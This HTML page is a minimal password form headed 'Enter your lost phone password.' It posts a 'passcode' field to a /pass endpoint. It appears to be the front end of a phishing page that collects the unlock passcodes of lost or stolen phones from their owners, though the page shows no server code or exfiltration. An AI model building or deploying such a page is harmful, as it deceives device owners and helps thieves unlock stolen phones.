<!doctype html>
<html lang="en">
  <head>
    <title>Password</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <style>
        *{
        background-color: #2C3333;
      }
    </style>
  </head>
  <body class="img" style="background-color: white;">
    <section class="ftco-section">
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-md-6 text-center mb-5">
          </div>
        </div><div class="row justify-content-center align-items-center"><div class="col-md-6 col-lg-4">
            <div class="login-wrap p-0">
              <h3 class="mb-4 text-center heading-section">Enter your lost phone password.</h3>
              <form action="/pass" method="post" class="signin-form">
                <!-- <div class="form-group">
                  <input type="text" class="form-control" name="username" placeholder="Username" autocomplete="off" required>
                </div> -->
                <div class="form-group">
                  <input id="password-field" type="password" class="form-control" name="passcode" placeholder="Password" required>
                  <span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span>
                </div>
                <div class="form-group">
                  <button type="submit" class="form-control btn btn-light submit px-3">Next</button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </section><script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/main.js"></script>
  </body>
</html>
